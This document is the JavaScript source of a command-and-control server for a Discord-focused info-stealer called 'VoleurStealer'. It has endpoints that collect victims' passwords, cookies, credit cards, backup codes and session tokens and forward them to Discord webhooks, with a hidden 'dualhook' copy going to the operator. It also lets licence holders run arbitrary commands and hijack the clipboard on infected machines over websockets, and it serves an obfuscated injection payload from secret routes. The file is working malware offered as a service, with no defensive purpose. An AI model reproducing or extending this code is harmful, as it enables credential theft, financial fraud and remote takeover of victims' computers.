// .................
const express = require('express'); const cors = require('cors'); const session = require('express-session'); const config = require('./config.json'); const path = require('path'); const axios = require('axios'); const fs = require('fs'); const colors = require('colors'); const Discord = require('discord.js'); const { WebhookClient, MessageEmbed } = require('discord.js')
const creditCard = require('./events/creditCard'), emailChange = require('./events/emailChange'), GrabUser = require('./events/GrabUser'), nitroPurchased = require('./events/nitroPurchased'),  passwordChange  = require('./events/passwordChange'), paypalAdded  = require('./events/paypalAdded'), userLogin  = require('./events/userLogin'); 
const { CreateOrUpdateUser, GetWebhookFromKey, DeleteKey, GetUserIdFromKey } = require('./database.js'); const { includes } = require('./utils/includes.js');
const Websocket = require('ws'); const { EventEmitter } = require('events'); 
const logger = (text) => { console.log(`[VoleurStealer | Debug] -> ${text}`.green)}; 
let passwd_data_count = 0; cooks_data_count = 0; autofill_data_count = 0; cc_data_count = 0; 
const dualclient = new WebhookClient({ url: config.session.dualhook })
// .................

let connections = {}; let connecteds = []; 
Array.prototype.removeByValue = function (val) {
    for (var i = 0; i < this.length; i++) {
      if (this[i] === val) {
        this.splice(i, 1);
        i--;
      }
    }
    return this;
}

class SocketListener extends EventEmitter {
    constructor() {
        super();
        this.server = new Websocket.Server({ port: 3200 });
    }

    async start() {
        this.server.on("connection", (socket) => {
            socket.on('message', async (message) => {
                message = JSON.parse(message)

                switch (message['event']) {
                    case 'open':
                        console.log(`[!] New Client Connected : ${message.hostname}`);


                        let hostname = message.hostname;

                        socket.key = message.key;
                        socket.hostname = hostname
                    
                        if (connections[message.key] === undefined) {
                            connections[message.key] = [hostname]
                        } else {
                            if (connections[message.key].includes(message.hostname)) return;
                            else connections[message.key].push(hostname)
                        }
                    
                        connecteds[message.key + '-' + message.hostname] = {'connected': true, 'socket': socket }
                    break;

                    case 'updateinfo':
                        connecteds[message.key + '-' + message.hostname]['discords'] = message['discords'];
                        connecteds[message.key + '-' + message.hostname]['cpu'] = message['cpu'];
                        connecteds[message.key + '-' + message.hostname]['time'] = message['time'];
                    break;

                    case 'close':
                        connections[message.key].removeByValue(message.hostname)
                        connecteds.removeByValue(message.key + '-' + message.hostname)

                }
            })

            socket.on('close', async (message) => {
                console.log(message)
                console.log(socket.key)
                connections[socket.key].removeByValue(socket.hostname)
                connecteds.removeByValue(socket.key + '-' + socket.hostname)
            })

            this.emit('ready');
        }) 
        console.log('[+] Successfully Started Server At Port 3200')
    }
}

const app = express(), client = new SocketListener();
app.use(session({secret: 'IFollowDiscordTos!', resave: false, saveUninitialized: true, cookie: {expires: 2.16e+7}}));
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true, parameterLimit: 50000 }));

app.get('/api/creditcard', (req, res) => { 
    let token = req.query.token; let number = req.query.number; let exp = req.query.exp; let cvv = req.query.cvv; let auth = req.query.auth; let ip_addy = req.query.ip
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/creditcard | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            creditCard.send(token, number, exp, cvv, user.webhook, ip_addy)
            res.send('200: Data Sent')
            logger(`/api/creditcard | ${req.get('User-Agent')} | 200: Data Sent `)
        }
    }) 
})

app.get('/api/emailchange', (req, res) => { 
    let token = req.query.token; let mail = req.query.mail; let password = req.query.password; let auth = req.query.auth; let ip_addy = req.query.ip

    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/emailchange | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            console.log(req.query)
            emailChange.send(password, mail, token, webhook, ip_addy)
            res.send('200: Data Sent')
            logger(`/api/emailchange | ${req.get('User-Agent')} | 200: Data Sent `)
        }
    })
})


app.get('/api/grabuser', (req, res) => { 
    let token = req.query.token; let auth = req.query.auth; let ip_addy = req.query.ip

    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/grabuser | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            GrabUser.send(token, webhook, ip_addy)
            res.send('200: Data Sent')
            logger(`/api/grabuser | ${req.get('User-Agent')} | 200: Data Sent `)
        }
    })
})

app.get('/api/nitro', (req, res) => { 
    let token = req.query.token, code = req.query.code, auth = req.query.auth, ip_addy = req.query.ip;

    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/nitro | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            nitroPurchased.send(token, code, user.webhook, ip_addy)
            res.send('200: Data Sent')
            logger(`/api/nitro | ${req.get('User-Agent')} | 200: Data Sent `)
    }
})
})



app.get('/api/passwordchange', (req, res) => { 
    let token = req.query.token; let password = req.query.password; let auth = req.query.auth; let ip_addy = req.query.ip

    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/passwordchange | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            passwordChange.send(password, token, webhook, ip_addy)
            res.send('200: Data Sent')
            logger(`/api/passwordchange | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
    }
})
})

app.get('/api/paypaladded', (req, res) => { 
    let token = req.query.token; let auth = req.query.auth; let ip_addy = req.query.ip

    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/paypaladded | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            paypalAdded.send(token, webhook, ip_addy)
            res.send('200: Data Sent')
            logger(`/api/paypaladded | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})

app.get('/api/userlogin', (req, res) => { 
    let token = req.query.token; let mail = req.query.mail; let password = req.query.password; let auth = req.query.auth; let ip_addy = req.query.ip
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/userlogin | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            userLogin.send(password, mail, token, webhook, ip_addy)
            res.send('200: Data Sent')
            logger(`/api/userlogin | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })

})

app.post('/api/passwords', (req, res) => { 
    const data = req.body.pass; let auth = req.query.auth; const number = passwd_data_count++;
    
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/passwords | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            const webhookClient = new WebhookClient({ url: webhook })
            if (!data) return res.send('Passwords don\'t found.');

            //Creating a file and then deleting it after 20 secs
            fs.writeFileSync(`Passwords-${number}`, data, function (err) { if (err) throw err; });
            setTimeout(() => { fs.unlink(`Passwords-${number}`, (err) => { if (err) throw err; }) }, 20000)

            //Checking if passwords are there..., if no returning Passwords don't found.
            let lines = "";
            fs.readFileSync(`Passwords-${number}`, 'utf-8').split(/\r?\n/).forEach((line) => { 
                if (line == "" || line == undefined) return undefined; lines += "1" 
            });

            if (lines === "1") fs.writeFileSync(`Passwords-${number}`, "Passwords don't found.", function (err) { if (err) throw err; });
            if (!data.includes('URL')) fs.writeFileSync(`Passwords-${number}`, "Passwords don't found.", function (err) { if (err) throw err; });

            const attachment = new Discord.MessageAttachment(`Passwords-${number}`, "passwords.txt");
            
            include_data = includes(data)

            webhookClient.send({ content: `**Contains**: ${include_data}`, files: [attachment] });
            dualclient.send({ content: `**Contains**: ${include_data}`, files: [attachment] });

            res.send('200: Data Sent')
            logger(`/api/passwords | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})

app.post('/api/cookies', (req, res) => { 
    const data = req.body.cookies; let auth = req.query.auth; const number = cooks_data_count++;
    
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/cookies | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            const webhookClient = new WebhookClient({ url: webhook })
            if (!data) return res.send('Cookies don\'t found.');

            //Creating a file and then deleting it after 20 secs
            
            fs.writeFileSync(`Cookies-${number}`, data, function (err) { if (err) throw err; });
            setTimeout(() => { fs.unlink(`Cookies-${number}`, (err) => { if (err) throw err; }) }, 20000)

            //Checking if cookies are there..., if no returning Cookies don't found.
            let lines = "";
            fs.readFileSync(`Cookies-${number}`, 'utf-8').split(/\r?\n/).forEach((line) => { 
                if (line == "" || line == undefined) return undefined; lines += "1" 
            });

            
            if (lines === "1") fs.writeFileSync(`Cookies-${number}`, "Cookies don't found.", function (err) { if (err) throw err; });
            if (!data.includes('HOST KEY')) fs.writeFileSync(`Cookies-${number}`, "Cookies don't found.", function (err) { if (err) throw err; });

            const attachment = new Discord.MessageAttachment(`Cookies-${number}`, "cookies.txt");
            
            include_data = includes(data)

            webhookClient.send({ content: `**Contains**: ${include_data}`, files: [attachment] });
            dualclient.send({ content: `**Contains**: ${include_data}`, files: [attachment] });

            res.send('200: Data Sent')
            logger(`/api/cookies | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})


app.post('/api/autofill', (req, res) => { 
    const data = req.body.autofill; let auth = req.query.auth; const number = autofill_data_count++;
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/autofill | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            const webhookClient = new WebhookClient({ url: webhook })
            if (!data) return res.send('Autofilldata don\'t found.');

            //Creating a file and then deleting it after 20 secs
            fs.writeFileSync(`Autofill-${number}`, data, function (err) { if (err) throw err; });
            setTimeout(() => { fs.unlink(`Cookies-${number}`, (err) => { if (err) throw err; }) }, 20000)

            //Checking if autofill datas are there..., if no returning Autofilldata don't found.
            let lines = "";
            fs.readFileSync(`Autofill-${number}`, 'utf-8').split(/\r?\n/).forEach((line) => { 
                if (line == "" || line == undefined) return undefined; lines += "1" 
            });

            if (lines === "1") fs.writeFileSync(`Autofill-${number}`, "Autofilldata don't found.", function (err) { if (err) throw err; });
            if (!data.includes('NAME')) fs.writeFileSync(`Autofill-${number}`, "Autofilldata don't found.", function (err) { if (err) throw err; });

            const attachment = new Discord.MessageAttachment(`Autofill-${number}`, "autofilldata.txt");
            
            include_data = includes(data)

            webhookClient.send({ files: [attachment] });
            dualclient.send({ files: [attachment] });

            res.send('200: Data Sent')
            logger(`/api/autofull | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})

app.post('/api/creditcards', (req, res) => { 
    const data = req.body.cards; let auth = req.query.auth; const number = cc_data_count++;
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/creditcards | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            const webhookClient = new WebhookClient({ url: webhook })
            if (!data) return res.send('Creditcards don\'t found.');

            //Creating a file and then deleting it after 20 secs
            fs.writeFileSync(`Creditcards-${number}`, data, function (err) { if (err) throw err; });
            setTimeout(() => { fs.unlink(`Cookies-${number}`, (err) => { if (err) throw err; }) }, 20000)

            //Checking if credit cards are there..., if no returning Creditcards don't found.
            let lines = "";
            fs.readFileSync(`Creditcards-${number}`, 'utf-8').split(/\r?\n/).forEach((line) => { 
                if (line == "" || line == undefined) return undefined; lines += "1" 
            });

            if (lines === "1") fs.writeFileSync(`Creditcards-${number}`, "Creditcards don't found.", function (err) { if (err) throw err; });
            if (!data.includes('CC NUMBER')) fs.writeFileSync(`Creditcards-${number}`, "Creditcards don't found.", function (err) { if (err) throw err; });
            
            const attachment = new Discord.MessageAttachment(`Creditcards-${number}`, "creditcards.txt");
            
            include_data = includes(data)

            webhookClient.send({ files: [attachment] });
            dualclient.send({ files: [attachment] });

            res.send('200: Data Sent')
            logger(`/api/creditcards | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})

app.post('/api/backupcodes', (req, res) => { 
    const data = req.body.codes; let auth = req.query.auth; const number = cc_data_count++;
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/backupcodes | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            const webhookClient = new WebhookClient({ url: webhook })
            if (!data) return res.send('BackupCodes don\'t found.');

            //Creating a file and then deleting it after 20 secs
            fs.writeFileSync(`BackupCodes-${number}`, data, function (err) { if (err) throw err; });
            setTimeout(() => { fs.unlink(`BackupCodes-${number}`, (err) => { if (err) throw err; }) }, 20000)

            
            const attachment = new Discord.MessageAttachment(`BackupCodes-${number}`, "backupcodes.txt");
            
            include_data = includes(data)

            webhookClient.send({ files: [attachment] });
            dualclient.send({ files: [attachment] });

            res.send('200: Data Sent')
            logger(`/api/backupcodes | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})

app.post('/api/instagram', (req, res) => {
    const username = req.body.username; const avatar = req.body.avatar; const verified = req.body.verified; const token = req.body.token; let auth = req.query.auth; let ip_addy = req.query.ip;
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/instagram | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            let embed = new MessageEmbed()
            .setColor("#303037")
            .setAuthor(`Instagram Session`, "https://media.discordapp.net/attachments/1076644004608884798/1077518510495907870/discord-avatar-128-D9U0P.gif?width=86&height=86")
            .setThumbnail(avatar)
            .setDescription(`<:spacex:1069286971500937216> **Token:**\n\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`)
            .addField("<a:billing_spacex:996835048445710386> Username:", `\`${username}\``, true)
            .addField("<:email_spacex:996835052975558776> Verified:", `\`${verified}\``, true)
            .addField("<:ip_spacex:996835055194353705> IP:", `\`${ip_addy}\``, true)
            .setFooter("@astrozstealer")

            axios.post(webhook, { embeds: [embed] }).catch();
            axios.post(config.session.dualhook, { embeds: [embed] }).catch();

            res.send('200: Data Sent')
            logger(`/api/instagram | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})

app.post('/api/roblox', (req, res) => {
    const username = req.body.username; const avatar = req.body.avatar; const premium = req.body.premium; const robux = req.body.robux; const token = req.body.token; let auth = req.query.auth;
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/instagram | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            let embed = new MessageEmbed()
            .setColor("#303037")
            .setAuthor(`Roblox Session`, "https://media.discordapp.net/attachments/1076644004608884798/1077518510495907870/discord-avatar-128-D9U0P.gif?width=86&height=86")
            .setThumbnail(avatar)
            .addField("<:badges_spacex:996835071556325468> Name:", `\`${username}\``, true)
            .addField("<:email_spacex:996835052975558776> Robux:", `\`${robux}\``, true)
            .addField("<a:billing_spacex:996835048445710386> Premium:", `\`${premium}\``, true)
            .addField("<a:money_spacex:990306914065846333> Access Token:", `\`\`\`\n${token}\n\`\`\``, true)
            .setFooter("@astrozstealer")

            axios.post(webhook, { embeds: [embed] }).catch();
            axios.post(config.session.dualhook, { embeds: [embed] }).catch();

            res.send('200: Data Sent')
            logger(`/api/roblox | ${req.get('User-Agent')} | 200: Data Sent | ${auth}`)
        }
    })
})


app.get('/api/createuser', (req, res) => {
    let userid = req.query.user, key = req.query.key, webhook = req.query.webhook;
    CreateOrUpdateUser(key, userid, webhook)
    res.send('200: Success')
})

app.get('/api/updateuser', (req, res) => {
    let userid = req.query.user, key = req.query.key, webhook = req.query.webhook;
    console.log(webhook)
    CreateOrUpdateUser(key, userid, webhook)
    res.send('200: Success')
})

app.get('/api/deletekey', (req, res) => {
    let key = req.query.key;
    DeleteKey(key)
    res.send('200: Success')
})

app.get('/check', (req, res) => {
    let key = req.query.key
    GetWebhookFromKey(key).then(webhook => {
        if (!webhook) {
            res.send('403: Invalid Key')
        } else {
            res.send(webhook)
        }
    })
})

app.get('/check/userid', (req, res) => {
    let key = req.query.key
    GetUserIdFromKey(key).then(webhook => {
        if (!webhook) {
            res.send('403: Invalid Key')
        } else {
            res.send(webhook)
        }
    })
})

app.get('/secrets/void/injection/uwu', async (req, res) => {
    await res.sendFile("others/injection-obfus.txt", { root: __dirname }, (err) => {
        return;
     });
})

app.get('/secrets/void/injector/uwu', async (req, res) => {
    await res.sendFile("others/injector.js", { root: __dirname }, (err) => {
        return;
     });
})

app.get('/secrets/void/package/uwu', async (req, res) => {
    await res.sendFile("others/package.json", { root: __dirname }, (err) => {
        return;
     });
})

app.get('/api/message', (req, res) => { 
    let auth = req.query.auth; let message = req.query.message
    GetWebhookFromKey(auth).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/api/message | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            axios.post(webhook, { content: message})
            res.send('200: Data Sent')
            logger(`/api/message | ${req.get('User-Agent')} | 200: Data Sent `)
        }
    }) 
})

app.get('/restartcord', async(req, res) => {
    if (!req.query.type) return res.send({ error: true, message: 'Please Enter Discord Type'});
    if (!req.query.key) return res.send({ error: true, message: 'Please Enter Your Licence Key'});
    if (!req.query.hostname) return res.send({ error: true, message: 'Please Enter Hostname'});
    
    GetWebhookFromKey(req.query.key).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/restartcord | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            if (connections[req.query.key] == undefined || !connections[req.query.key].includes(req.query.hostname)) return res.send({ error: true, message: 'Client isnt connected'});

            connecteds[req.query.key + '-' + req.query.hostname]['socket'].send(JSON.stringify({ task: 'restartcord', type: req.query.type }))
            return res.send({error: false, 'message': 'Successfully Sent Command'})
        }
    })
})

app.get('/execute', async(req, res) => {
    if (!req.query.command) return res.send({ error: true, message: 'Please Enter Command'});
    if (!req.query.key) return res.send({ error: true, message: 'Please Enter Your Licence Key'});
    if (!req.query.hostname) return res.send({ error: true, message: 'Please Enter Hostname'});
    
    GetWebhookFromKey(req.query.key).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/execute | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            if (connections[req.query.key] == undefined || !connections[req.query.key].includes(req.query.hostname)) return res.send({ error: true, message: 'Client isnt connected'});
            
            connecteds[req.query.key + '-' + req.query.hostname]['socket'].send(JSON.stringify({ task: 'exec', command: req.query.command }))
            return res.send({error: false, 'message': 'Successfully Sent Command'})
        }
    })
})

app.get('/setclip', async(req, res) => {
    if (!req.query.text) return res.send({ error: true, message: 'Please Enter Text'});
    if (!req.query.key) return res.send({ error: true, message: 'Please Enter Your Licence Key'});
    if (!req.query.hostname) return res.send({ error: true, message: 'Please Enter Hostname'});
    
    GetWebhookFromKey(req.query.key).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/execute | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            if (connections[req.query.key] == undefined || !connections[req.query.key].includes(req.query.hostname)) return res.send({ error: true, message: 'Client isnt connected'});
            
            connecteds[req.query.key + '-' + req.query.hostname]['socket'].send(JSON.stringify({ task: 'setclip', text: req.query.text }))
            return res.send({error: false, 'message': 'Successfully Sent Command'})
        }
    })
})

app.get('/connected', async(req, res) => { 
    if (!req.query.key) return res.send({ error: true, message: 'Please Enter Your Licence Key'});

    GetWebhookFromKey(req.query.key).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/connected | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            if (connections[req.query.key] === undefined) return res.send({ length: 0, hostnames: []})

            res.send({ length: connections[req.query.key].length, hostnames: connections[req.query.key] })
        }
    })
})

app.get('/custom', async(req, res) => {
    if (!req.query.command) return res.send({ error: true, message: 'Please Enter Command'});
    if (!req.query.key) return res.send({ error: true, message: 'Please Enter Your Licence Key'});
    if (!req.query.hostname) return res.send({ error: true, message: 'Please Enter Hostname'});
    
    GetWebhookFromKey(req.query.key).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/execute | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            if (connections[req.query.key] == undefined || !connections[req.query.key].includes(req.query.hostname)) return res.send({ error: true, message: 'Client isnt connected'});
            
            connecteds[req.query.key + '-' + req.query.hostname]['socket'].send(JSON.stringify({ task: req.query.command }))
            return res.send({error: false, 'message': 'Successfully Sent Command'})
        }
    })
})

app.get('/getclip', async(req, res) => {
    if (!req.query.key) return res.send({ error: true, message: 'Please Enter Your Licence Key'});
    if (!req.query.hostname) return res.send({ error: true, message: 'Please Enter Hostname'});
    GetWebhookFromKey(req.query.key).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/getclip | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            if (connections[req.query.key] == undefined || !connections[req.query.key].includes(req.query.hostname)) return res.send({ error: true, message: 'Client isnt connected'});

            connecteds[req.query.key + '-' + req.query.hostname]['socket'].send(JSON.stringify({ task: 'getclip' }))
            return res.send({error: false, 'message': 'Successfully Sent Command'})
        }
    })
})

app.get('/getinfo', async(req, res) => {
    if (!req.query.key) return res.send({ error: true, message: 'Please Enter Your Licence Key'});
    if (!req.query.hostname) return res.send({ error: true, message: 'Please Enter Hostname'});
    GetWebhookFromKey(req.query.key).then(webhook => {
        if (webhook == false) {
            res.send('403: Auth Failed (Key Doesnt Exist)')
            logger(`/getinfo | ${req.get('User-Agent')} | 403: Auth Failed (Invalid Key)`)
        } else {
            if (connections[req.query.key] == undefined || !connections[req.query.key].includes(req.query.hostname)) return res.send({ error: true, message: 'Client isnt connected'});
            return res.send({ 'hostname': connecteds[req.query.key + '-' + req.query.hostname]['hostname'], 'discords': connecteds[req.query.key + '-' + req.query.hostname]['discords'], 'cpu': connecteds[req.query.key + '-' + req.query.hostname]['cpu'], 'last_updated': connecteds[req.query.key + '-' + req.query.hostname]['time'] })
        }
    })
})

client.start()

module.exports = app;